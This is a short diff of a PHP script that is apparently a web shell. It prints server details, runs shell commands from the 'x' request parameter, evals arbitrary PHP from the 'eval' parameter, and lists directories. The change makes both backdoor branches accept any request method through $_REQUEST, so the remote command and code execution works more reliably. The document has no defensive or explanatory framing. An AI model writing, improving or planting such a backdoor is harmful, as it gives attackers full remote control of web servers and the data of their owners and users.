@@ -59,11 +59,10 @@ echo $server->name.'<br>';
 echo $server->kernel.'<br>';
 echo $server->software.'<br>';
 
-if(isset($_GET['x'])) {
-	echo '<pre>'.$server->cmd($_GET['x']).'</pre>';
+if(isset($_REQUEST['x'])) {
+	echo '<pre>'.$server->cmd($_REQUEST['x']).'</pre>';
 }
-if(isset($_POST['eval'])) {
-	eval($_GET['eval']);
+if(isset($_REQUEST['eval'])) {
+	eval($_REQUEST['eval']);
 }
 echo $server->scdir(getcwd());
-__halt_compiler();?>
